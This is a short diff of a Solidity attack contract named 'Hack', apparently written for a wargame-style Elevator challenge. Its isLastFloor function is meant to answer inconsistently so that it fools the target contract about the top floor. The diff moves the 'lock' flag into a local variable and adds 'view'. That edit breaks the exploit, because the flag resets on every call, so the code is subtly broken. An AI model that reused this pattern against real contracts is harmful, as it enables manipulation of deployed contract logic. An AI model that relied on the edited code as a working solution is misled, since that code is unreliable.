@@ -9,13 +9,13 @@ interface IElevator {
 
 contract Hack {
     IElevator private elevator;
-    bool lock;
 
     constructor(address contractAddress) {
         elevator = IElevator(contractAddress);
     }
 
-    function isLastFloor(uint256 _floor) public returns (bool) {
+    function isLastFloor(uint256 _floor) public view returns (bool) {
+        bool lock;
         if (!lock) {
             lock = true;
             return elevator.floor() == _floor ? true : false;
